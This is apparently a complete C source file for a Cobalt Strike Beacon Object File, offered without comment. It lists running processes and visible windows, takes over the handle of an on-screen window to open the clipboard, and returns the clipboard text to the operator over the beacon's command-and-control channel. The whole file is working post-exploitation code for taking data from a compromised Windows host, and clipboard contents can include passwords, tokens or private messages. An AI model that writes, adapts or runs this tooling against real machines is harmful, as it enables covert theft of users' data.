#include <windows.h>
#include <winuser.h>
#include <tlhelp32.h>
#include "beacon.h"

DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$EnumWindows(WNDENUMPROC, LPARAM);
DECLSPEC_IMPORT WINUSERAPI DWORD WINAPI USER32$GetWindowThreadProcessId(HWND, LPDWORD);
DECLSPEC_IMPORT WINUSERAPI int WINAPI USER32$GetWindowTextA(HWND, LPSTR, int);
DECLSPEC_IMPORT WINUSERAPI int WINAPI USER32$GetClassNameA(HWND, LPSTR, int);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$IsWindowVisible(HWND);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT WINUSERAPI HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$IsClipboardFormatAvailable(UINT);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

int my_strlen(const char* str) {
    int len = 0;
    if (str) {
        while (str[len] != 0) {
            len++;
        }
    }
    return len;
}

typedef struct {
    DWORD allPids[128];
    int pidCount;
    HWND foundHwnd;
    int windowCount;
    formatp* format;
} EnumData;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    EnumData* data = (EnumData*)lParam;
    DWORD windowPid = 0;
    char windowText[256];
    char className[256];
    BOOL isTargetProcess = FALSE;
    int i;
    
    for(i = 0; i < 256; i++) {
        windowText[i] = 0;
        className[i] = 0;
    }
    
    USER32$GetWindowThreadProcessId(hwnd, &windowPid);
    
    USER32$GetWindowTextA(hwnd, windowText, 255);
    USER32$GetClassNameA(hwnd, className, 255);
    
    for (i = 0; i < data->pidCount; i++) {
        if (windowPid == data->allPids[i]) {
            isTargetProcess = TRUE;
            break;
        }
    }
    
    if (isTargetProcess) {
        
        if (!USER32$IsWindowVisible(hwnd)) {
            return TRUE;
        }
        
        if (my_strlen(windowText) == 0) {
            return TRUE;
        }
        data->windowCount++;
        
        BeaconFormatPrintf(data->format, "[+] Actionable window (HWND: 0x%p) PID: %d\n", hwnd, windowPid);
        BeaconFormatPrintf(data->format, "    Title: %s\n", windowText);
        BeaconFormatPrintf(data->format, "    Class: %s\n", my_strlen(className) > 0 ? className : "<No Class>");
        
        if (data->foundHwnd == NULL) {
            data->foundHwnd = hwnd;
        }
    }
    
    return TRUE; 
}

int FindAllProcesses(DWORD* allPids, int maxPids, formatp* format) {
    int pidCount = 0;
    HANDLE snapshot;
    PROCESSENTRY32 pe32;
    
    snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(format, "[-] Failed to create process snapshot\n");
        return 0;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (KERNEL32$Process32First(snapshot, &pe32)) {
        do {
            if (pidCount >= maxPids) {
                BeaconFormatPrintf(format, "[!] Reached maximum PID limit (%d)\n", maxPids);
                break;
            }
            
            
            allPids[pidCount] = pe32.th32ProcessID;
            pidCount++;
            
        } while (KERNEL32$Process32Next(snapshot, &pe32) && pidCount < maxPids);
    }
    
    KERNEL32$CloseHandle(snapshot);
    BeaconFormatPrintf(format, "[+] Found %d total processes\n", pidCount);
    
    return pidCount;
}

BOOL TestClipboardAccess(HWND hwnd, formatp* format) {
    char truncatedText[101];
    int i;
    
    BeaconFormatPrintf(format, "[*] Testing clipboard access with HWND: 0x%p\n", hwnd);
    
    if (!USER32$OpenClipboard(hwnd)) {
        BeaconFormatPrintf(format, "[-] Failed to open clipboard with this HWND\n");
        return FALSE;
    }
    
    BeaconFormatPrintf(format, "[+] Successfully opened clipboard with HWND!\n");
    
    if (USER32$IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE hClipData = USER32$GetClipboardData(CF_TEXT);
        if (hClipData != NULL) {
            char* pClipText = (char*)KERNEL32$GlobalLock(hClipData);
            if (pClipText != NULL) {
                for(i = 0; i < 101; i++) {
                    truncatedText[i] = 0;
                }
                
                for(i = 0; i < 100 && pClipText[i] != 0; i++) {
                    truncatedText[i] = pClipText[i];
                }
                
                BeaconFormatPrintf(format, "[+] Clipboard contents: %s%s\n", 
                    truncatedText, my_strlen(pClipText) > 100 ? "..." : "");
                KERNEL32$GlobalUnlock(hClipData);
            }
        }
    } else {
        BeaconFormatPrintf(format, "[*] No text data available in clipboard\n");
    }
    
    USER32$CloseClipboard();
    return TRUE;
}

void go(char * args, unsigned long alen) {
    formatp format;
    EnumData enumData;
    DWORD currentPid;
    int i;
    
    BeaconFormatAlloc(&format, 8192);
    
    enumData.pidCount = 0;
    enumData.foundHwnd = NULL;
    enumData.windowCount = 0;
    enumData.format = &format;
    for(i = 0; i < 128; i++) {
        enumData.allPids[i] = 0;
    }
    
    
    currentPid = KERNEL32$GetCurrentProcessId();
    BeaconFormatPrintf(&format, "[*] Current Process ID: %d\n", currentPid);
    BeaconFormatPrintf(&format, "[*] Attempting to enumerate all processes...\n");
    enumData.pidCount = FindAllProcesses(enumData.allPids, 128, &format);
    
    if (enumData.pidCount == 0) {
        BeaconFormatPrintf(&format, "[-] No processes found!\n");
        goto cleanup;
    }
    
    BeaconFormatPrintf(&format, "\n=== first 10 processes ===\n");
    for (i = 0; i < enumData.pidCount && i < 10; i++) {
        BeaconFormatPrintf(&format, "PID: %d%s", enumData.allPids[i], 
            (i + 1) % 5 == 0 ? "\n" : ", ");
    }
    if (enumData.pidCount > 10) {
        BeaconFormatPrintf(&format, "\n... and %d more processes", enumData.pidCount - 10);
    }
    BeaconFormatPrintf(&format, "\n\n");
    
    USER32$EnumWindows(EnumWindowsProc, (LPARAM)&enumData);
    
    BeaconFormatPrintf(&format, "\n=== Summary of actionable windows ===\n");
    BeaconFormatPrintf(&format, "[*] Actionable windows found: %d\n", enumData.windowCount);
    BeaconFormatPrintf(&format, "[*] Filtering applied: Visible windows with titles only\n");
    
    if (enumData.foundHwnd != NULL) {
        BeaconFormatPrintf(&format, "[+] Using HWND 0x%p for clipboard access\n", enumData.foundHwnd);
        
        if (TestClipboardAccess(enumData.foundHwnd, &format)) {
            BeaconFormatPrintf(&format, "[+] Clipboard access successful using found HWND!\n");
        }
    } else {
        BeaconFormatPrintf(&format, "[-] No suitable HWND found. Falling back to NULL for clipboard access.\n");
        BeaconFormatPrintf(&format, "\n=== Testing Clipboard Access with NULL ===\n");
        
        if (TestClipboardAccess(NULL, &format)) {
            BeaconFormatPrintf(&format, "[+] Clipboard access successful using NULL HWND\n");
        }
    }
    
    BeaconFormatPrintf(&format, "\n[*] BOF execution completed\n");
    
cleanup:
    {
        int size = 0;
        char* output = BeaconFormatToString(&format, &size);
        BeaconOutput(CALLBACK_OUTPUT, output, size);
        BeaconFormatFree(&format);
    }

}
